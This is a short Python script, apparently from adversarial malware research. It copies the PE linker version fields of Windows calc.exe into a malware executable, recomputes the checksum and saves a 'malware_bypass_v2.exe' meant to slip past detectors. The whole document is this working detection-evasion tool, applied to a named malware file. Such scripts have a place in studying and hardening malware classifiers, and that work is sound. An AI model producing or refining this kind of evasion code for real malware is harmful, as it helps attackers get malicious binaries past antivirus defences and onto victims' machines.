import pefile

def mimic_benign_file(malware_path, benign_path, output_path):
    try:
        benign_pe = pefile.PE(benign_path)
        safe_major = benign_pe.OPTIONAL_HEADER.MajorLinkerVersion
        safe_minor = benign_pe.OPTIONAL_HEADER.MinorLinkerVersion
        print(f"[*] Mimicking Benign File: Major={safe_major}, Minor={safe_minor}")

        mal_pe = pefile.PE(malware_path)
        mal_pe.OPTIONAL_HEADER.MajorLinkerVersion = safe_major
        mal_pe.OPTIONAL_HEADER.MinorLinkerVersion = safe_minor
        
        mal_pe.OPTIONAL_HEADER.CheckSum = mal_pe.generate_checksum()
        
        mal_pe.write(output_path)
        print(f"[+] Optimised Adversarial Sample Saved: {output_path}")
        
    except Exception as e:
        print(f"Error: {e}")


mimic_benign_file('C:/Users/JOHN/Desktop/m47h.exe', 'C:\\Windows\\System32\\calc.exe', 'malware_bypass_v2.exe')